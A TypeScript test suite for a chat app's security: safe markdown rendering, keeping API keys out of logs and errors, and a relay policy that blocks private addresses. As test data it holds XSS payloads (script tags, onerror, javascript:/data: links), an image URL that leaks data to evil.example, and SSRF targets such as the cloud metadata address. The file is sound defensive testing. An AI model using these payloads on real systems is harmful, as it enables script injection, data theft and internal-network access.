import { render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { Markdown } from "@/features/markdown/markdown";
import { NexaError } from "@/lib/errors";
import { isBlockedTarget, isPrivateAddress, relayAllowedOrigin } from "@/lib/relay-policy";
import { caught, collect, jsonResponse, makeAdapter, makeRequest, mockFetch, TEST_KEY } from "./helpers";

function renderMarkdown(content: string): HTMLElement {
  return render(<Markdown content={content} />).container;
}

describe("Markdown rendering is safe", () => {
  it("renders raw HTML as text, never as markup", () => {
    const html = renderMarkdown("<script>window.pwned = true</script>\n\n<img src=x onerror=alert(1)>\n\n<iframe src=https://evil.example></iframe>");
    expect(html.querySelector("script")).toBeNull();
    expect(html.querySelector("iframe")).toBeNull();
    expect(html.querySelector("[onerror]")).toBeNull();
  });

  it.each([
    "[click](javascript:alert(1))",
    "[click](JaVaScRiPt:alert(1))",
    "[click](vbscript:msgbox(1))",
    "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  ])("strips the dangerous link %s", (content) => {
    const href = renderMarkdown(content).querySelector("a")?.getAttribute("href") ?? "";
    expect(href).not.toMatch(/^(javascript|vbscript|data):/i);
  });

  it("opens links safely", () => {
    const link = renderMarkdown("[site](https://example.com)").querySelector("a");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toContain("noopener");
    expect(link?.getAttribute("rel")).toContain("noreferrer");
  });

  it("never loads a remote image by itself, so output can't leak data through a URL", () => {
    const html = renderMarkdown("![x](https://evil.example/leak?data=secret)");
    expect(html.querySelector("img")).toBeNull();
    expect(screen.getByRole("button").textContent).toContain("evil.example");
  });

  it("keeps code as text before highlighting", () => {
    const html = renderMarkdown("```html\n<script>alert(1)</script>\n```");
    expect(html.querySelector("script")).toBeNull();
    expect(html.querySelector("code")?.textContent).toContain("<script>");
  });

  it("renders the features a response needs", () => {
    const html = renderMarkdown("# Title\n\n- one\n- two\n\n| a | b |\n| - | - |\n| 1 | 2 |\n\n> quote\n\n**bold**");
    expect(html.querySelector("h1")?.textContent).toBe("Title");
    expect(html.querySelectorAll("li")).toHaveLength(2);
    expect(html.querySelector("table")).not.toBeNull();
    expect(html.querySelector("blockquote")).not.toBeNull();
    expect(html.querySelector("strong")?.textContent).toBe("bold");
  });
});

describe("API keys never leak", () => {
  it("writes nothing to the console while handling a failed request", async () => {
    const spies = (["log", "info", "warn", "error", "debug"] as const).map((method) => vi.spyOn(console, method));
    const { fetch } = mockFetch(jsonResponse({ error: { message: `bad key ${TEST_KEY}` } }, 401));
    await caught(() => collect(makeAdapter("openai", fetch).streamMessage(makeRequest())));
    for (const spy of spies) expect(spy).not.toHaveBeenCalled();
  });

  it("keeps a key out of serialized errors", () => {
    const error = new NexaError("unknown", { details: `Authorization: Bearer ${TEST_KEY}` });
    expect(JSON.stringify(error.toJSON())).not.toContain(TEST_KEY);
  });
});

describe("Relay policy", () => {
  it.each([
    ["http://api.example.com", /https/],
    ["https://localhost:8080", /local/],
    ["https://127.0.0.1", /local/],
    ["https://10.0.0.5", /private/],
    ["https://192.168.1.1", /private/],
    ["https://172.16.0.1", /private/],
    ["https://169.254.169.254/latest/meta-data", /private/],
    ["https://[::1]", /local/],
    ["https://[fd00::1]", /private/],
    ["https://metadata.internal", /internal/],
    ["https://intranet", /internal/],
    ["https://user:pw@api.example.com", /credentials/],
    ["not a url", /valid URL/],
  ])("refuses %s", (url, reason) => {
    expect(isBlockedTarget(url)).toMatch(reason);
  });

  it("allows a public https endpoint", () => {
    expect(isBlockedTarget("https://api.example.com/v1/chat/completions")).toBeNull();
    expect(isBlockedTarget("https://172.32.0.1/v1")).toBeNull();
  });

  it("recognises private addresses returned by DNS", () => {
    expect(isPrivateAddress("10.1.2.3")).toBe(true);
    expect(isPrivateAddress("::ffff:10.1.2.3")).toBe(true);
    expect(isPrivateAddress("fe80::1")).toBe(true);
    expect(isPrivateAddress("93.184.216.34")).toBe(false);
    expect(isPrivateAddress("2606:2800:220:1::1")).toBe(false);
  });

  it("only serves its own origin and listed origins", () => {
    expect(relayAllowedOrigin("https://nexa.app", "https://nexa.app", undefined)).toBe(true);
    expect(relayAllowedOrigin("https://evil.example", "https://nexa.app", undefined)).toBe(false);
    expect(relayAllowedOrigin(null, "https://nexa.app", undefined)).toBe(false);
    expect(relayAllowedOrigin("https://b.app", "https://nexa.app", "https://a.app, https://b.app")).toBe(true);
  });
});
